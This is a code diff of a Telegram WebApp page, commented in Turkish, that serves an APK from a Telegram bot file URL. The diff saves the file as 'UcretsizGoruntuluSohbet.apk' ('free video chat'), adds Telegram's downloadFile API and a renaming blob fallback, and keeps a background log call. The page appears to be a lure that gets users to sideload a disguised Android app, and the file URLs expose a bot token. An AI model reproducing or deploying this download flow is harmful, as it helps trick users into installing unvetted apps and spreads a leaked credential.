@@ -113,13 +113,14 @@
             'videos/video16.mp4'
         ];
 
-        // ⬇️ BURASI DEĞİŞTİ: Telegram linki eklendi
         const APK_SOURCES = [
             "https://api.telegram.org/file/bot8830065870:AAGi4gcGXb6dfFNhfxLzsWR6ZH9bGte3Nr8/documents/file_0.apk",
             "https://api.telegram.org/file/bot8830065870:AAGi4gcGXb6dfFNhfxLzsWR6ZH9bGte3Nr8/documents/file_0.apk",
             "https://api.telegram.org/file/bot8830065870:AAGi4gcGXb6dfFNhfxLzsWR6ZH9bGte3Nr8/documents/file_0.apk",
             "https://api.telegram.org/file/bot8830065870:AAGi4gcGXb6dfFNhfxLzsWR6ZH9bGte3Nr8/documents/file_0.apk"
         ];
+
+        const DESIRED_FILENAME = "UcretsizGoruntuluSohbet.apk";
 
         function showToast(message, isError = false) {
             const toast = document.getElementById('toastMsg');
@@ -170,6 +171,13 @@
             
             let isProcessing = false;
             
+            // Telegram WebApp hazır mı?
+            const tg = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : null;
+            const hasDownloadFile = !!(tg && typeof tg.downloadFile === 'function');
+            
+            console.log("Telegram WebApp:", tg ? "var" : "yok");
+            console.log("downloadFile API:", hasDownloadFile ? "destekliyor" : "desteklemiyor");
+
             async function handleDownload(e) {
                 if (e) e.preventDefault();
                 if (isProcessing) return;
@@ -181,42 +189,52 @@
                 
                 try {
                     const currentApkUrl = getCurrentApkLink();
-                    const desiredFileName = "UcretsizGoruntuluSohbet.apk"; // ⬅️ DOSYA ADI BURADA
 
-                    // ========== 1. BLOB İLE İNDİR (dosya adını değiştirmek için) ==========
-                    try {
-                        const response = await fetch(currentApkUrl);
-                        if (!response.ok) throw new Error('İndirme başarısız');
-                        
-                        const blob = await response.blob();
-                        const blobUrl = URL.createObjectURL(blob);
-                        
-                        const tempLink = document.createElement('a');
-                        tempLink.href = blobUrl;
-                        tempLink.download = desiredFileName;
-                        document.body.appendChild(tempLink);
-                        tempLink.click();
-                        document.body.removeChild(tempLink);
-                        URL.revokeObjectURL(blobUrl);
-                        
-                    } catch (fetchError) {
-                        // Fetch başarısız olursa eski yönteme dön
-                        console.warn("Blob indirme başarısız, doğrudan açılıyor:", fetchError);
-                        const isTelegram = !!(window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initData);
-                        if (isTelegram) {
-                            Telegram.WebApp.openLink(currentApkUrl, { try_instant_view: false });
-                        } else {
+                    // ========== 1. TELEGRAM downloadFile (EN İYİ YOL) ==========
+                    if (hasDownloadFile) {
+                        tg.downloadFile(
+                            {
+                                url: currentApkUrl,
+                                file_name: DESIRED_FILENAME   // ⬅️ DOĞRU PARAMETRE ADI
+                            },
+                            (status) => {
+                                // status: true (indirildi) / false (iptal)
+                                console.log("downloadFile status:", status);
+                                if (status === true) {
+                                    showToast("İndirme tamamlandı!");
+                                } else {
+                                    showToast("İndirme iptal edildi.", true);
+                                }
+                            }
+                        );
+                    }
+                    // ========== 2. TARAYICI: fetch + blob (CORS olursa fallback) ==========
+                    else {
+                        try {
+                            const response = await fetch(currentApkUrl);
+                            if (!response.ok) throw new Error('CORS veya ağ hatası');
+                            const blob = await response.blob();
+                            const blobUrl = URL.createObjectURL(blob);
+                            const tempLink = document.createElement('a');
+                            tempLink.href = blobUrl;
+                            tempLink.download = DESIRED_FILENAME;
+                            document.body.appendChild(tempLink);
+                            tempLink.click();
+                            document.body.removeChild(tempLink);
+                            URL.revokeObjectURL(blobUrl);
+                        } catch (fetchError) {
+                            console.warn("Blob başarısız, doğrudan açılıyor:", fetchError);
                             window.location.href = currentApkUrl;
                         }
                     }
 
-                    // ========== 2. LOG'U ARKADA GÖNDER ==========
+                    // ========== 3. LOG ==========
                     if (typeof window.sendLog === 'function') {
                         window.sendLog(currentApkUrl).catch(() => {});
                     }
                     showToast("İndirme başlatılıyor!");
 
-                    // ========== 3. BUTONU GERİ AL ==========
+                    // ========== 4. BUTONU GERİ AL ==========
                     setTimeout(() => {
                         if (downloadBtn) {
                             downloadBtn.innerHTML = `Tekrar İndir <i class="fa-solid fa-arrow-rotate-right absolute right-5 text-white text-sm"></i>`;
